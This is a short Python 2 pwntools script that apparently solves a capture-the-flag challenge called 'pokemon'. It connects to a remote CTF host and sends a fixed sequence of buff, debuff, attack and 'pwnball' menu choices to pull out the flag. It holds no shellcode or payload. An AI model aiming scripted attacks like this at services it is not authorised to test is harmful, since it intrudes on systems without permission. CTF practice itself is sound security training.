from pwn import *

def attack(p):
    print p.recvuntil('> ')
    p.sendline('1')

def helh(p, decide):
    if decide == 'buff':
        print p.recvuntil('> ')
        p.sendline('2')
        print p.recvuntil('> ')
        p.sendline('1')
    elif decide == 'debuff':
        print p.recvuntil('> ')
        p.sendline('2')
        print p.recvuntil('> ')
        p.sendline('2')

def pwnball(p):
    print p.recvuntil('> ')
    p.sendline('3')
    print p.recvall()

#p = process('./pokemon')
p = remote('hack.bckdr.in', 10013)


buff = 'buff'
debuff = 'debuff'

helh(p, buff)
attack(p)
attack(p)
helh(p, debuff)
for i in range(11):
    attack(p)
pwnball(p)
